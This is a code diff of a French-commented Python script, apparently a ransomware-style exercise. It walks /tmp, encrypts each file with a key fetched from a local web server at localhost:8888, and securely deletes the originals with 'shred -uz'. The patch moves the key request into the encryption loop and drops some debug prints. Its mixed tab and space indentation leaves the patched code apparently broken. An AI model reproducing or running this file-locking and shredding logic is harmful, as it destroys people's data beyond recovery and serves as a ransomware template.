@@ -70,13 +70,6 @@ def decryptFile(key, filename, chunksize=24*1024):
 
 def main(argv):
 
-    #faire une requête get au serveur web pour récupérer la clé
-    url = 'http://localhost:8888/key.txt'
-    resp = requests.get(url)
-    key=resp.text
-    key=key.rstrip("\n")
-    key= key.encode('utf-8')
-
     # Le dossier à chiffrer
     directory = '/tmp'
 
@@ -91,20 +84,24 @@ def main(argv):
     for root, dirs, files in os.walk(directory, topdown=False):
        for name in files:
             file = os.path.join(root, name)
-            #print(file)
 
             # déchiffrement
             if is_decrypt:
                 if file[-4:] == ".enc":
-                    #print("[*] Decrypting... ")
                     decryptFile(key, file)
-	             #utilisation de commande bash shred pour supprimer de manière sécurisé les fichiers .enc
+	            #utilisation de commande bash shred pour supprimer de manière sécurisé les fichiers .enc
                     subprocess.check_output(["shred", "-uz", file])
 
             # chiffrement
             else:
-                if file[-4:] != ".enc":
-                    #print("[*] Encrypting... ")
+                if file[-4:] != ".enc": 
+		    #faire une requête get au serveur web pour récupérer la clé
+    		    url = 'http://localhost:8888/key.txt'
+    		    resp = requests.get(url)
+    		    key= resp.text
+    	     	    key= key.rstrip("\n")
+    		    key= key.encode('utf-8')
+		    #chiffrement
                     encryptFile(key, file)
                     #utilisation de commande bash shred pour supprimer de manière sécurisé les fichiers d'origine
                     subprocess.check_output(["shred", "-uz", file])
